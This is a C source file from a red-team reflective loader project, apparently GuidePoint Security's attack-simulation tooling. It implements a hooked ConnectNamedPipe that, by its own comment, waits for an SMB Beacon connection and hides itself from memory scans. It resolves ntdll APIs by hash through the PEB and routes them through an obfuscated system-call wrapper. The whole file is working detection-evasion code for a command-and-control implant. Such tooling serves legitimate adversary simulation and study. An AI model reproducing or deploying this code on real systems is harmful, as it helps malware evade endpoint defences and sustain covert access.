/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack SimulatioN
 *
**/

#include "Common.h"

/* CTL Codes */
#define FSCTL_PIPE_LISTEN		CTL_CODE( FILE_DEVICE_NAMED_PIPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS )

typedef struct
{
	D_API( NtWaitForSingleObject );
	D_API( RtlNtStatusToDosError );
	D_API( RtlSetLastWin32Error );
	D_API( NtFsControlFile );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890 /* RtlNtStatusToDosError */
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374 /* RtlSetLastWin32Error */
#define H_API_NTFSCONTROLFILE		0xecdfd601 /* NtFsControlFile */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Awaits for a connection for a SMB Beacon, and
 * creates a ROP chain to hide itself from any
 * memory scans.
 *
!*/
D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LPOVERLAPPED lpOverlapped )
{
	API			Api;
	IO_STATUS_BLOCK		Isb;

	BOOLEAN			Ret = TRUE;
	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;

	PVOID			Apc = NULL;
	PVOID*			Ag1 = NULL;
	PVOID*			Ag2 = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.NtFsControlFile       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFSCONTROLFILE );
	Api.RtlAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	if ( lpOverlapped != NULL ) 
	{
		lpOverlapped->Internal = STATUS_PENDING;
		Apc = C_PTR( U_PTR( U_PTR( lpOverlapped->hEvent ) & 0x1 ) ? NULL : lpOverlapped );

		if ( ( Ag1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 10 * sizeof( PVOID ) ) ) != NULL ) {

			/* Execute NtFsControlFile */
			Ag1[ 0 ] = C_PTR( hNamedPipe );
			Ag1[ 1 ] = C_PTR( lpOverlapped->hEvent );
			Ag1[ 2 ] = C_PTR( NULL );
			Ag1[ 3 ] = C_PTR( Apc );
			Ag1[ 4 ] = C_PTR( lpOverlapped );
			Ag1[ 5 ] = C_PTR( FSCTL_PIPE_LISTEN );
			Ag1[ 6 ] = C_PTR( NULL );
			Ag1[ 7 ] = C_PTR( 0 );
			Ag1[ 8 ] = C_PTR( NULL );
			Ag1[ 9 ] = C_PTR( 0 );
			Nst = ObfSystemCall( Api.NtFsControlFile, Ag1, 10 );

			/* Free argument buffer */
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ag1 );
		} else 
		{
			/* Notify about lack of resources */
			Nst = STATUS_INSUFFICIENT_RESOURCES;
		};

		/* Did we fail or recieve a STATUS_PENDING operation? */
		if ( ! NT_SUCCESS( Nst ) || Nst == STATUS_PENDING ) { 
			Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
			Ret = FALSE;
		};
	} else {

		if ( ( Ag1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 10 * sizeof( PVOID ) ) ) != NULL ) {

			/* Execute NtFsControlFile */
			Ag1[ 0 ] = C_PTR( hNamedPipe );
			Ag1[ 1 ] = C_PTR( NULL );
			Ag1[ 2 ] = C_PTR( NULL );
			Ag1[ 3 ] = C_PTR( NULL );
			Ag1[ 4 ] = C_PTR( &Isb );
			Ag1[ 5 ] = C_PTR( FSCTL_PIPE_LISTEN );
			Ag1[ 6 ] = C_PTR( NULL );
			Ag1[ 7 ] = C_PTR( 0 );
			Ag1[ 8 ] = C_PTR( NULL );
			Ag1[ 9 ] = C_PTR( 0 );
			Nst = ObfSystemCall( Api.NtFsControlFile, Ag1, 10 );

			/* Is it still waiting? */
			if ( Nst == STATUS_PENDING ) {		
				if ( ( Ag2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 3 * sizeof( PVOID ) ) ) != NULL ) {
					/* Execute NtWaitForSingleObject */
					Ag2[ 0 ] = C_PTR( hNamedPipe );
					Ag2[ 1 ] = C_PTR( FALSE );
					Ag2[ 2 ] = C_PTR( NULL );
					Nst = ObfSystemCall( Api.NtWaitForSingleObject, Ag2, 3 );

					if ( NT_SUCCESS( Nst ) ) { 
						Nst = Isb.Status;
					};
					/* Free the argument buffer */
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ag2 );
				} else 
				{
					/* Notify about the lack of resources */
					Nst = STATUS_INSUFFICIENT_RESOURCES;
				};
			};
			/* Free the argument buffer */
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ag1 );
		} else 
		{ 
			/* Notify about the lack of resources */
			Nst = STATUS_INSUFFICIENT_RESOURCES; 
		};

		/* Set the error and return code */
		if ( ! NT_SUCCESS( Nst ) ) {
			Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
			Ret = FALSE;
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );

	/* Return */
	return Ret;
};
